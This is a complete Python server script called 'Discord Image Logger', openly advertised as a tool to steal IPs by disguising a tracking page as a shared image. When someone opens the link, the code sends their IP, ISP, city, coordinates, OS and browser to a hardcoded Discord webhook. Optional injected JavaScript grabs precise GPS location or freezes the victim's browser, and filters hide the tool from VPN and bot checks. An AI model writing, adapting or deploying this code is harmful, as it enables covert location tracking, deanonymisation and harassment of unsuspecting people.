# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1120021403429781666/VB_8fYSd_Tkrezi9wunsaHoNh2KEGVDfzbZIixbQi9iHvCUlyHAwJRO9MM4bLqxQfbO5",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
